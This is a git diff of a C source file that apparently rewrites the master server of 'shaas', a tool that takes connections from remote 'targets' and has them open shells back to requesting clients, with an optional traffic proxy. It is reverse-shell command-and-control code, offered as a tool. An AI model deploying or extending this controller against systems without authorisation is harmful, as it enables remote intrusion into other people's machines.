@@ -1,477 +1,565 @@
-#define _GNU_SOURCE
-#include "include/shaas/config.h"
-#include <signal.h>
 #include <stdio.h>
 #include <string.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <errno.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <signal.h>
+#include <poll.h>
+#include <assert.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/ioctl.h>
 #include <shaas/request.h>
 #include <shaas/config.h>
 
-// LOCAL TYPE DEFINITIONS
-struct target_data {
-  struct sockaddr_in saddr;
-  int fd;
-  int request_fd;
-  pthread_t thread;
-  pthread_cond_t cond;
-  pthread_mutex_t mutex;
+#define info(fmt, ...) \
+  printf("[*] " fmt "\n", ##__VA_ARGS__)
+#define success(fmt, ...) \
+  printf("[+] " fmt "\n", ##__VA_ARGS__)
+#define error(fmt, ...) \
+  fprintf(stderr, "[!] " fmt ": %s\n", ##__VA_ARGS__, strerror(errno))
+
+#define POLLRDHUP 0x2000
+
+union pollfds {
+  struct pollfd all[MASTER_TARGETS_MAX + 1];  
+  struct {
+    struct pollfd socket;
+    struct pollfd targets[MASTER_TARGETS_MAX];
+  };
 };
-/* ****************************************** */
 
-// PROTOS
-static int
-wait_and_handle_requests(int target_fd, struct target_data *tgt);
-static int
-send_close_magic(int target_fd, char *success);
-/* ****************************************** */
+struct target {
+  int fd;
+};
 
-// GLOBAL VARS
-static struct target_data targets_data[MASTER_TARGETS_MAX];
-static sigset_t thread_sigmask;
-static pthread_t clients_listener_thread;
-static int clients_listener_fd;
 static int running;
-/* ****************************************** */
+static pthread_mutex_t m_targets;
+static struct target targets[MASTER_TARGETS_MAX];
 
-// SIGNAL HANDLERS
-static void sigalrm_handler(int signo) {
-  // This is only here to interrupt syscalls
-  fprintf(stderr, "[!] (thread %d) Interruption requested\n", gettid());
-}
+#ifdef MASTER_PROXY
+struct __attribute__((packed)) proxy {
+  struct pollfd target_pfd;
+  struct pollfd client_pfd;
+};
+
+static int proxy_sock_fd;
+static size_t n_proxies;
+static pthread_mutex_t m_proxies;
+static struct proxy proxies[MASTER_CLIENTS_MAX];
+static struct sockaddr_in proxy_addr;
+#endif
 
 static void
-sigterm_handler(int signo) {
-  pthread_exit(NULL);
-}
-
-static void
-sigint_handler(int signo) {
+sigint_handler(int _) {
+  (void)_;
   running = 0;
-  putchar('\n'); // Evict ^C
-}
-
-/* ****************************************** */
-
-static void*
-alarm_thread_routine(void *data) {
-  pthread_t thd = (pthread_t)data;
-  sleep(CONN_TIMEOUT);
-  pthread_kill(thd, SIGALRM);
-  return NULL;
-}
-
-static pthread_t
-start_timeout_alarm(pthread_t thd) {
-  pthread_t alarm;
-  pthread_create(&alarm, NULL, &alarm_thread_routine, (void*)thd);
-  return alarm;
-}
-
-static void
-stop_timeout_alarm(pthread_t alarm) {
-  pthread_kill(alarm, SIGTERM);
+  putchar('\n');
 }
 
 static int
-send_close_magic(int target_fd, char* success) {
-  union client_request request;
-  const unsigned char close_magic[] = CLOSE_MAGIC;
-  memcpy(request.bytes, close_magic, sizeof(close_magic));
-  write(target_fd, &request, sizeof(union client_request));
-  if (success != NULL)  
-    return read(target_fd, success, 1);
-  else {
-    success = 0;
-    return 0;
+find_first_free_target_id(target_id_t* out) {
+  target_id_t i;
+  assert(out != NULL);
+  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
+    if (targets[i].fd == 0) {
+      *out = i;
+      return 0;
+    }
   }
+  return -1;
 }
 
-static void*
-client_listener_thread_routine(void* data) {
-  struct sockaddr_in sock_addr, request_addr;
-  struct target_data* td;
-  // in_addr_t target_addr;
-  size_t target_id;
-  socklen_t request_addr_len;
-  int request_fd;
-  long rc;
-  pthread_t alarm;
+static target_id_t
+get_target_id_from_fd(int fd) {
+  target_id_t i;
+  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
+    if (targets[i].fd == fd)
+      return i;
+  }
+  assert(0 && "unreachable");
+}
 
-  pthread_sigmask(SIG_BLOCK, &thread_sigmask, NULL);
+static int
+create_and_bind_socket(struct sockaddr_in* addr) {
+  int rc, sock_fd;
 
-  rc = clients_listener_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+  rc = sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (rc < 0) {
-    perror("clients listener socket()");
+    error("could not create socket");
     goto early_fail;
   }
 
   rc = 1;
-  rc = setsockopt(
-    clients_listener_fd,
-    SOL_SOCKET,
-    SO_REUSEADDR,
-    &rc,
-    sizeof(int));
+  rc = setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &rc, sizeof(rc));
   if (rc < 0) {
-    perror("clients listener setsockopt()");
-    goto closefd_fail;
+    error("could not set SO_REUSEADDR on socket");
+    goto close_fail;
   }
 
-  sock_addr.sin_family = AF_INET;
-  sock_addr.sin_addr.s_addr = INADDR_ANY;
-  sock_addr.sin_port = htons(MASTER_REQUEST_PORT);
+  addr->sin_family = AF_INET;
 
-  rc = bind(clients_listener_fd, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
+  rc = bind(sock_fd, (struct sockaddr*)addr, sizeof(*addr));
   if (rc < 0) {
-    perror("clients listener bind()");
-    goto closefd_fail;
+    error("could not bind socket to %d", ntohs(addr->sin_port));
+    goto close_fail;
   }
 
-  rc = listen(clients_listener_fd, MASTER_TARGETS_MAX);
+  rc = listen(sock_fd, 5);
   if (rc < 0) {
-    perror("clients listener listen()");
-    goto closefd_fail;
+    error("could not listen on socket");
+    goto close_fail;
   }
 
-  printf(
-    "[*] Client listener bound on port %d. Listening for clients...\n",
-    MASTER_REQUEST_PORT);
-
-  while (running) {
-    request_addr_len = sizeof(struct sockaddr_in);
-    rc = request_fd =
-        accept(clients_listener_fd, (struct sockaddr*)&request_addr, &request_addr_len);
-    if (rc < 0) {
-      if (!running)
-        break;
-      perror("clients listener accept()");
-      continue;
-    }
-
-    // Let's try and read 4 bytes from request_fd to get the target's ID
-    alarm = start_timeout_alarm(clients_listener_thread);
-    rc = read(request_fd, &target_id, sizeof(size_t));
-    if (rc < 0) {
-      perror("clients listener read()");
-      close(request_fd);
-      continue;
-    }
-    stop_timeout_alarm(alarm);
-
-    printf("[*] A client requested the target with ID %zu\n", target_id);
-
-    if (target_id < MASTER_TARGETS_MAX) {
-      td = &targets_data[target_id];
-      if (td->fd > 0) {
-        pthread_mutex_lock(&td->mutex);
-        td->request_fd = request_fd;
-        pthread_mutex_unlock(&td->mutex);
-        pthread_cond_signal(&td->cond);
-      } else
-        goto else_case;
-    } else {
-    else_case:
-      fputs("[!] Client asked for an ID I don't have", stderr);
-      close(request_fd);
-    }
-  }
-
-closefd_fail:
-  close(clients_listener_fd);
-  clients_listener_fd = 0;
+  success("bound socket with fd %d on port %d", sock_fd, ntohs(addr->sin_port));
+  return sock_fd;
+close_fail:
+  close(sock_fd);
 early_fail:
-  puts("[*] Bye bye from clients listener thread");
-  return NULL;
+  return rc;
 }
 
-static void*
-target_listener_thread_routine(void* data) {
-  struct sockaddr_in target_addr;
-  struct target_data* td;
-  int tid, rc, target_fd;
-  char success, ip_str[INET_ADDRSTRLEN];
+#ifdef MASTER_PROXY
+static int
+transfer_data(int from, int to) {
+  int n, chunk_size, rc;
+  char buf[4096];
 
-  pthread_sigmask(SIG_BLOCK, &thread_sigmask, NULL);
-  tid = gettid();
-
-  // Unpack
-  td = (struct target_data*)data;
-  pthread_mutex_lock(&td->mutex);
-  target_addr = td->saddr;
-  target_fd = td->fd;
-  pthread_mutex_unlock(&td->mutex);
-
-  // Handle the connection
-  inet_ntop(AF_INET, &target_addr.sin_addr, ip_str, sizeof(ip_str));
-  printf("[*] (thread %d) Target connected from %s\n", tid, ip_str);
-
-  rc = wait_and_handle_requests(target_fd, td);
+  rc = ioctl(from, FIONREAD, &n);
   if (rc < 0) {
-    fprintf(stderr, "[!] (thread %d) target listener wait_and_handle_requests(): error\n", tid);
-    // TODO: error handling?
+    perror("ioctl");
+    goto fail;
   }
 
-  rc = send_close_magic(target_fd, &success);
-  if (rc < 0 || !success)
-    fprintf(
-      stderr,
-      "[!] (thread %d) Target did not respond to close request\n",
-      tid);
-  close(target_fd);
+  while (n > 0) {
+    chunk_size = n > sizeof(buf) ? sizeof(buf) : n;
+    rc = chunk_size = read(from, buf, chunk_size);
+    if (rc < 0)
+      goto fail;
+    rc = write(to, buf, rc);
+    if (rc < 0)
+      goto fail;
+    n -= chunk_size;
+  }
 
-  printf("[*] Bye bye from thread %d\n", tid);
+fail:
+  return rc;
+}
+
+static int
+create_and_connect_socket(struct sockaddr_in* addr) {
+  int rc, sock_fd;
+  char ip_str[INET_ADDRSTRLEN];
+
+  rc = sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (rc < 0) {
+    error("could not create socket");
+    goto early_fail;
+  }
+
+  inet_ntop(AF_INET, &addr->sin_addr, ip_str, sizeof(ip_str));
+  addr->sin_family = AF_INET;
+
+  rc = connect(sock_fd, (struct sockaddr*)addr, sizeof(*addr));
+  if (rc < 0) {
+    error("could not connect socket to %s:%d", ip_str, ntohs(addr->sin_port));
+    goto close_fail;
+  }
+
+  success("connected socket with fd %d to %s:%d", sock_fd, ip_str, ntohs(addr->sin_port));
+  return sock_fd;
+close_fail:
+  close(sock_fd);
+early_fail:
+  return rc;
+}
+
+static struct proxy*
+get_next_proxy_slot(void) {
+  if (n_proxies < MASTER_CLIENTS_MAX)
+    return &proxies[n_proxies++];
   return NULL;
 }
 
 static int
-wait_and_handle_requests(int target_fd, struct target_data *td) {
-  char success;
-  int rc, request_fd, tid;
-  pthread_t thd;
-  pthread_t alarm;
-  in_addr_t request_ip;
-  in_port_t request_port;
-  struct sockaddr_in request_addr;
-  union client_request request;
-  char ip_str[INET_ADDRSTRLEN];
+open_proxy_socket(void) {
+  int rc;
+  socklen_t proxy_addr_len;
 
-  success = 1;
-  thd = td->thread;
-  tid = gettid();
-  while (running) {
-    // Wait for listener thread to hand us a client connection
-    pthread_mutex_lock(&td->mutex);
-    pthread_cond_wait(&td->cond, &td->mutex);
-    request_fd = td->request_fd;
-    td->request_fd = 0;
-    pthread_mutex_unlock(&td->mutex);
-    if (!running)
-      break;
-    
-    if (request_fd <= 0) {
-      fprintf(stderr, "[!] (thread %d) Received invalid request_fd\n", tid);
-      continue;
-    }
+  proxy_addr.sin_addr.s_addr = INADDR_ANY;
+  proxy_addr.sin_port = htons(0);
 
-    inet_ntop(AF_INET, &request_addr.sin_addr, ip_str, sizeof(ip_str));
-    printf("[*] (thread %d) Incoming request from %s\n", tid, ip_str);
-
-    alarm = start_timeout_alarm(thd);
-    rc = read(request_fd, &request_ip, sizeof(in_addr_t));
-    if (rc < 0) {
-      fprintf(stderr, "[!] (thread %d) Read fail!\n", tid);
-      perror("target listener read()");
-      goto end_connection;
-    }
-    rc = read(request_fd, &request_port, sizeof(in_port_t));
-    if (rc < 0) {
-      fprintf(stderr, "[!] (thread %d) Read fail!\n", tid);
-      perror("target listener read()");
-      goto end_connection;
-    }
-    stop_timeout_alarm(alarm);
-
-    request.client_ip = request_ip;
-    request.client_port = request_port;
-
-    inet_ntop(AF_INET, &request_ip, ip_str, sizeof(ip_str));
-    printf("[*] Asking client %zu to connect to %s:%d\n", td - targets_data, ip_str, ntohs(request_port));
-
-    alarm = start_timeout_alarm(thd);
-    write(target_fd, &request, sizeof(union client_request));
-    rc = read(target_fd, &success, 1);
-    if (rc < 0) {
-      fprintf(stderr, "[*] (thread %d) Read fail!\n", tid);
-      perror("target listener read()");
-      success = 0;
-    }
-    if (!success) {
-      fprintf(
-        stderr,
-        "[*] (thread %d) Target could not spawn a shell!\n",
-        tid);
-    }
-    write(request_fd, &success, 1);
-    stop_timeout_alarm(alarm);
-
-  end_connection:
-    close(request_fd);
-    td->request_fd = 0;
+  rc = proxy_sock_fd = create_and_bind_socket(&proxy_addr);
+  if (rc < 0) {
+    info("could not create proxy socket");
+    goto early_fail;
   }
 
+  proxy_addr_len = sizeof(proxy_addr);
+  rc = getsockname(proxy_sock_fd, (struct sockaddr*)&proxy_addr, &proxy_addr_len);
+  if (rc < 0) {
+    error("could not get proxy socket port");
+    goto close_fail;
+  }
+
+  success("created proxy socket on port %d", ntohs(proxy_addr.sin_port));
+  return 0;
+close_fail:
+  close(proxy_sock_fd);
+early_fail:
   return rc;
+}
+
+static struct proxy*
+setup_proxy(union client_request* req, struct sockaddr_in* req_addr) {
+  int rc;
+  struct proxy* proxy;
+  
+  req_addr->sin_port = req->connect_port;
+
+  pthread_mutex_lock(&m_proxies);
+
+  proxy = get_next_proxy_slot();
+  if (proxy == NULL) {
+    info("could not find a free proxy slot");
+    return NULL;
+  }
+
+  rc = proxy->client_pfd.fd = create_and_connect_socket(req_addr);
+  if (rc < 0) {
+    info("could not connect to client socket for proxying");
+    goto fail;
+  }
+
+  pthread_mutex_unlock(&m_proxies);
+
+  inet_pton(AF_INET, MASTER_IP, &req->connect_ip);
+  req->connect_port = proxy_addr.sin_port;
+
+  return proxy;
+fail:
+  memset(proxy, 0, sizeof(struct proxy));
+  return NULL;
+}
+
+#endif
+
+static int
+handle_request(int request_fd, struct sockaddr_in* request_addr) {
+  char success;
+  target_id_t target_id;
+  int rc, target_fd;
+  union client_request req;
+#ifdef MASTER_PROXY
+  socklen_t target_addr_len;
+  struct sockaddr_in target_addr;
+  struct proxy* proxy;
+#endif
+
+  success = 0;
+#ifdef MASTER_PROXY
+  proxy = NULL;
+#endif
+
+  rc = read(request_fd, &target_id, sizeof(target_id));
+  if (rc < 0) {
+    error("could not read target id from client");
+    goto out;
+  }
+
+  rc = read(request_fd, &req.connect_ip, sizeof(in_addr_t));
+  if (rc < 0) {
+    error("could not read client ip from client");
+    goto out;
+  }
+
+  rc = read(request_fd, &req.connect_port, sizeof(in_port_t));
+  if (rc < 0) {
+    error("could not read client port from client");
+    goto out;
+  }
+
+#ifdef MASTER_PROXY
+  proxy = setup_proxy(&req, request_addr);
+  if (proxy == NULL) {
+    info("could not setup a proxy");
+    rc = -1;
+    goto out;
+  }
+#endif
+  
+  if (target_id < MASTER_TARGETS_MAX) {
+    pthread_mutex_lock(&m_targets);
+    target_fd = targets[target_id].fd;
+    if (target_fd <= 0)
+      goto fail;
+    pthread_mutex_unlock(&m_targets);
+
+    rc = write(target_fd, &req, sizeof(req));
+    if (rc < 0) {
+      error("could not fufill client request to connect to target %u", target_id);
+      goto fail;
+    }
+
+    rc = read(target_fd, &success, sizeof(success));
+    if (rc < 0) {
+      error("could not read ACK response from target");
+      goto fail;
+    }
+
+#ifdef MASTER_PROXY
+    target_addr_len = sizeof(target_addr);
+    rc = proxy->target_pfd.fd = accept(proxy_sock_fd, (struct sockaddr*)&target_addr, &target_addr_len);
+    if (rc < 0) {
+      error("could not accept connection from target");
+      goto fail;
+    }
+    proxy->client_pfd.events = proxy->target_pfd.events = POLLIN | POLLRDHUP;
+
+    success("created proxy between sockets %d <-> %d", proxy->client_pfd.fd, proxy->target_pfd.fd);
+#endif
+    
+    success = 1;
+  }
+
+fail:
+  write(request_fd, &success, sizeof(success));
+#ifdef MASTER_PROXY
+  if (!success && proxy != NULL)
+    proxy->client_pfd.fd = proxy->target_pfd.fd = 0;
+#endif
+out:
+  return rc;
+}
+
+static void*
+request_listener_routine(void* arg) {
+  int rc, sock_fd, request_fd;
+  socklen_t request_addr_len;
+  struct pollfd pfd;
+  struct sockaddr_in request_addr, request_listener_addr;
+  char ip_str[INET_ADDRSTRLEN];
+
+  request_listener_addr.sin_addr.s_addr = INADDR_ANY;
+  request_listener_addr.sin_port = htons(MASTER_REQUEST_PORT);
+
+  rc = sock_fd = create_and_bind_socket(&request_listener_addr);
+  if (rc < 0) {
+    info("could not initialize client listener");
+    goto out;
+  }
+
+  pfd.fd = sock_fd;
+  pfd.events = POLLIN;
+  while (running) {
+    rc = poll(&pfd, 1, 1000);
+    if (rc < 0) {
+      if (errno == EINTR)
+        continue;
+      error("could not poll request socket");
+      break;
+    }
+    if (rc == 0)
+      continue;
+
+    request_addr_len = sizeof(request_addr);
+    rc = request_fd = accept(sock_fd, (struct sockaddr*)&request_addr, &request_addr_len);
+    if (rc < 0) {
+      error("could not accept client connection");
+      continue;
+    }
+    inet_ntop(AF_INET, &request_addr.sin_addr, ip_str, sizeof(ip_str));
+    success("accepted client connection from %s:%d", ip_str, ntohs(request_addr.sin_port));
+    rc = handle_request(request_fd, &request_addr);
+    if (rc < 0)
+      info("could not handle request from client %s:%d", ip_str, ntohs(request_addr.sin_port));
+    close(request_fd);
+  }
+
+  close(sock_fd);
+out:
+  running = 0;
+  return NULL;
+}
+
+static void*
+target_listener_routine(void* arg) {
+  target_id_t id;
+  size_t i, j, n_targets;
+  int rc, sock_fd, target_fd;
+  socklen_t target_addr_len;
+  struct pollfd* pfd;
+  union pollfds pfds;
+  struct sockaddr_in target_addr, target_listener_addr;
+  char ip_str[INET_ADDRSTRLEN];
+
+  target_listener_addr.sin_addr.s_addr = INADDR_ANY;
+  target_listener_addr.sin_port = htons(MASTER_TARGET_PORT);
+
+  rc = sock_fd = create_and_bind_socket(&target_listener_addr);
+  if (rc < 0) {
+    info("could not initialize target listener");
+    goto out;
+  }
+
+  n_targets = 0;
+  pfds.socket.fd = sock_fd;
+  pfds.socket.events = POLLIN;
+  while (running) {
+    rc = poll(pfds.all, n_targets + 1, 1000);
+    if (rc < 0) {
+      if (errno == EINTR)
+        continue;
+      error("could not poll targets");
+      break;
+    }
+    if (rc == 0)
+      continue;
+
+    // check if a target is trying to connect
+    if (pfds.socket.revents & POLLIN) {
+      target_addr_len = sizeof(target_addr);
+      rc = target_fd = accept(sock_fd, (struct sockaddr*)&target_addr, &target_addr_len);
+      if (rc < 0) {
+        error("could not accept target connection");
+        continue;
+      }
+
+      pthread_mutex_lock(&m_targets);
+      
+      rc = find_first_free_target_id(&id);
+      if (rc < 0) {
+        close(target_fd);
+        info("could not accept target connection: too many targets");
+        continue;
+      }
+      
+      pfds.targets[n_targets].fd = targets[id].fd = target_fd;
+      pfds.targets[n_targets].events = POLLRDHUP;
+
+      inet_ntop(AF_INET, &target_addr.sin_addr, ip_str, sizeof(ip_str));
+      success("accepted target (%zu) connection from %s:%d", n_targets, ip_str, ntohs(target_addr.sin_port));
+
+      ++n_targets;
+      
+      pthread_mutex_unlock(&m_targets);
+    }
+
+    // check if a target has disconnected
+    pthread_mutex_lock(&m_targets);
+    for (i = 0; i < n_targets; ++i) {
+      pfd = pfds.targets + i;
+      if (pfd->revents & POLLRDHUP) {
+        id = get_target_id_from_fd(pfd->fd);
+        info("target (%d) disconnected", id);
+        close(targets[id].fd);
+        targets[id].fd = 0;
+        --n_targets;
+        for (j = i--; j < n_targets; ++j)
+          pfds.targets[j] = pfds.targets[j+1];
+      }
+    }
+    pthread_mutex_unlock(&m_targets);
+  }
+
+  for (i = 0; i < n_targets; ++i)
+    close(pfds.targets[i].fd);
+
+  close(sock_fd);
+out:
+  running = 0;
+  return NULL;
 }
 
 int
 main(void) {
-  int rc, master_fd, target_fd;
-  socklen_t target_addr_len;
-  size_t i, tries, pool_index;
-  struct target_data* td;
-  struct sockaddr_in master_addr, target_addr;
-  struct sigaction sigint_action, sigpipe_action;
-  struct sigaction sigalrm_action, sigterm_action;
-  char ip_str[INET_ADDRSTRLEN];
+  int rc;
+  struct sigaction sigint;
+  pthread_t client_listener, target_listener;
+#ifdef MASTER_PROXY
+  size_t i, j;
+  struct proxy* proxy;
+#endif
 
-  memset(targets_data, 0, sizeof(targets_data));
-  clients_listener_fd = 0,
-  pool_index = 0;
-
-  sigemptyset(&thread_sigmask);
-  sigaddset(&thread_sigmask, SIGINT);
-
-  sigpipe_action.sa_flags = 0;
-  sigpipe_action.sa_handler = SIG_IGN;
-  sigemptyset(&sigpipe_action.sa_mask);
-  rc = sigaction(SIGPIPE, &sigpipe_action, NULL);
+  sigint.sa_handler = &sigint_handler;
+  sigint.sa_flags = 0;
+  sigemptyset(&sigint.sa_mask);
+  rc = sigaction(SIGINT, &sigint, NULL);
   if (rc < 0) {
-    perror("sigaction(SIGPIPE)");
-    goto early_fail;
+    error("could not set SIGINT handler");
+    goto out;
   }
+
+  memset(targets, 0, sizeof(targets));
+#ifdef MASTER_PROXY
+  memset(proxies, 0, sizeof(proxies));
+
+  rc = open_proxy_socket();
+  if (rc < 0)
+    goto out;
   
-  sigint_action.sa_flags = 0;
-  sigint_action.sa_handler = &sigint_handler;
-  sigemptyset(&sigint_action.sa_mask);
-  rc = sigaction(SIGINT, &sigint_action, NULL);
-  if (rc < 0) {
-    perror("sigaction(SIGINT)");
-    goto early_fail;
-  }
-
-  sigalrm_action.sa_flags = 0;
-  sigalrm_action.sa_handler = &sigalrm_handler;
-  sigemptyset(&sigalrm_action.sa_mask);
-  rc = sigaction(SIGALRM, &sigalrm_action, NULL);
-  if (rc < 0) {
-    perror("sigaction(SIGALRM)");
-    goto early_fail;
-  }
-
-  sigterm_action.sa_flags = 0;
-  sigterm_action.sa_handler = &sigterm_handler;
-  sigemptyset(&sigterm_action.sa_mask);
-  rc = sigaction(SIGTERM, &sigterm_action, NULL);
-  if (rc < 0) {
-    perror("sigaction(SIGTERM)");
-    goto early_fail;
-  }
-
-  rc = master_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
-  if (rc < 0) {
-    perror("main socket()");
-    goto early_fail;
-  }
-
-  rc = 1;
-  rc = setsockopt(master_fd, SOL_SOCKET, SO_REUSEADDR, &rc, sizeof(int));
-  if (rc < 0) {
-    perror("main setsockopt()");
-    goto close_masterfd;
-  }
-
-  master_addr.sin_family = AF_INET;
-  master_addr.sin_addr.s_addr = INADDR_ANY;
-  master_addr.sin_port = htons(MASTER_TARGET_PORT);
-
-  rc = bind(
-      master_fd,
-      (struct sockaddr*)&master_addr,
-      sizeof(struct sockaddr_in));
-  if (rc < 0) {
-    perror("bind");
-    goto close_masterfd;
-  }
-
-  printf("[*] Bound on port %d. Listening for targets\n", MASTER_TARGET_PORT);
-
-  // Initialize locks and conds
-  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
-    pthread_mutex_init(&targets_data[i].mutex, NULL);
-    pthread_cond_init(&targets_data[i].cond, NULL);
-  }
-
-  rc = listen(master_fd, MASTER_TARGETS_MAX);
-  if (rc < 0) {
-    perror("main listen()");
-    goto close_masterfd;
-  }
+  n_proxies = 0;
   
+  pthread_mutex_init(&m_proxies, NULL);
+#endif
+  pthread_mutex_init(&m_targets, NULL);
+
   running = 1;
 
-  // We launch the listener thread
-  pthread_create(&clients_listener_thread, NULL, &client_listener_thread_routine, NULL);
+  rc = pthread_create(&client_listener, NULL, &request_listener_routine, NULL);
+  if (rc < 0) {
+    error("could not create client listener thread");
+    goto out;
+  }
 
-  // Listen for targets connections until we get SIGINT
+  rc = pthread_create(&target_listener, NULL, &target_listener_routine, NULL);
+  if (rc < 0) {
+    error("could not create client listener thread");
+    goto out;
+  }
+
+#ifdef MASTER_PROXY
   while (running) {
-    target_addr_len = sizeof(struct sockaddr_in);
-    rc = target_fd =
-        accept(master_fd, (struct sockaddr*)&target_addr, &target_addr_len);
+    rc = poll((struct pollfd*)proxies, n_proxies << 1, 1000);
     if (rc < 0) {
-      if (!running)
-        break;
-      perror("main accept()");
-      continue;
+      if (errno == EINTR)
+        continue;
+      error("could not poll proxies");
+      break;
     }
+    if (rc == 0)
+      continue;
 
-    td = &targets_data[pool_index];
+    for (i = 0; i < n_proxies; ++i) {
+      proxy = proxies + i;      
+      // check if either the client or the target has disconnected
+      if ((proxy->target_pfd.revents | proxy->client_pfd.revents) & (POLLRDHUP | POLLERR)) {
+        pthread_mutex_lock(&m_proxies);
+        
+        close(proxy->target_pfd.fd);
+        close(proxy->client_pfd.fd);
+        
+        --n_proxies;
+        for (j = i--; j < n_proxies; ++j)
+          proxies[j] = proxies[j+1];
 
-    // We try to acquire the lock for a number of slot, before giving up
-    for (tries = 0; tries < MASTER_TARGETS_MAX; ++tries) {
-      if (pthread_mutex_trylock(&targets_data[pool_index].mutex) == 0) {
-        if (td->fd == 0)
-          break;
-        pthread_mutex_unlock(&td->mutex);
+        info("closing proxy between sockets %d <-> %d", proxy->client_pfd.fd, proxy->target_pfd.fd);
+
+        pthread_mutex_unlock(&m_proxies);
+        continue;
       }
-      pool_index = (pool_index+1) % MASTER_TARGETS_MAX;
-    }
 
-    // No slots, discard connection (sorry pal)
-    if (tries == MASTER_TARGETS_MAX)
-      continue;
-
-    // We have handled sync, now let's launch the thread
-    td->fd = target_fd;
-    td->saddr = target_addr;
-    pthread_create(
-      &td->thread,
-      NULL,
-      &target_listener_thread_routine,
-      (void*)td);
-    
-    inet_ntop(
-      target_addr.sin_family,
-      &target_addr.sin_addr,
-      ip_str,
-      sizeof(ip_str));
-    printf("[*] Accepted connection from target with IP %s (target ID is %lu)\n", ip_str, pool_index);
-
-    // We can no longer use this slot
-    pool_index = (pool_index+1) % MASTER_TARGETS_MAX;
-
-    pthread_mutex_unlock(&td->mutex);
-  }
-
-  if (clients_listener_fd > 0) {
-    pthread_kill(clients_listener_thread, SIGALRM);
-    pthread_join(clients_listener_thread, NULL);
-  }
-
-  for (i = 0; i < MASTER_TARGETS_MAX; ++i) {
-    td = &targets_data[i];
-    if (td->thread != 0) {
-      pthread_cond_signal(&td->cond);
-      pthread_join(td->thread, NULL);
+      if (proxy->target_pfd.revents & POLLIN)
+        transfer_data(proxy->target_pfd.fd, proxy->client_pfd.fd);
+      if (proxy->client_pfd.revents & POLLIN)
+        transfer_data(proxy->client_pfd.fd, proxy->target_pfd.fd);
     }
   }
+#endif
 
-  rc = 0;
-  puts("[*] Bye bye from targets listener thread!");
-close_masterfd:
-  close(master_fd);
-early_fail:
+  pthread_join(client_listener, NULL);
+  pthread_join(target_listener, NULL);
+
+out:
   return rc;
 }
